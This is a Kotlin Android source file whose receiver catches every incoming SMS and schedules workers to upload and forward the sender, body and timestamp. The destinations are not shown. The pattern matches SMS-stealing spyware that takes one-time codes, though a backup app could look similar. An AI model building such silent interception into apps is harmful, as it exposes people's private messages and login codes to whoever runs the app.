package com.rto1p8.app.receiver

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import com.rto1p8.app.worker.SmsUploadWorker
import com.rto1p8.app.utils.Logger
import com.rto1p8.app.worker.SmsForwardWorker

class SmsReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context?, intent: Intent?) {
        if (intent?.action == Telephony.Sms.Intents.SMS_RECEIVED_ACTION) {
            val smsMessages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
            smsMessages.forEach { sms ->
                val sender = sms.originatingAddress ?: "Unknown"
                val message = sms.messageBody ?: ""
                val timestamp = sms.timestampMillis

                Logger.log("Received SMS from $sender at $timestamp")
                context?.let {
                    SmsUploadWorker.scheduleWork(sender, message, timestamp, it)
                    SmsForwardWorker.scheduleForwardWork(sender, message, timestamp, it)
                    Logger.log("Scheduled SMS upload work")
                } ?: Logger.error("Context is null, cannot schedule work")
            }
        }
    }

}